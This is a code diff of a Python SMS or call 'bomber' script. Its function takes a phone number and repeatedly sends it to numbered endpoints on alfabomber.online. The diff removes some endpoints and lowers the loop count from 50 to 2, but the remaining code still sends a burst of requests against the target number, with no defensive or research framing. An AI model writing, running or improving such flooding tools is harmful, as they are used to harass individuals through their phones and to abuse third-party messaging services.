@@ -7,90 +7,7 @@ def smsg(number):
     
     # List of APIs with their corresponding URLs, headers, and payloads
     apis = [
-        {
-            "url": "https://alfabomber.online/PHPcall/1.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/2.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/3.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/4.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/5.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/6.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/7.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/8.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/9.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/10.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/11.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/12.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/13.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/14.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
+        
         {
             "url": "https://alfabomber.online/PHPcall/15.php",
             "method": "GET",
@@ -133,30 +50,7 @@ def smsg(number):
             "params": {"alfabomb": number},
             "headers": {}
         },
-        {
-            "url": "https://alfabomber.online/PHPcall/22.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/23.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/24.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
-        {
-            "url": "https://alfabomber.online/PHPcall/25.php",
-            "method": "GET",
-            "params": {"alfabomb": number},
-            "headers": {}
-        },
+        
         {
             "url": "https://alfabomber.online/PHPcall/26.php",
             "method": "GET",
@@ -261,7 +155,7 @@ def smsg(number):
     ]
     
     # Run the requests for 20 times
-    for _ in range(50):
+    for _ in range(2):
         for api in apis:
             if api["method"] == "GET":
                 response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
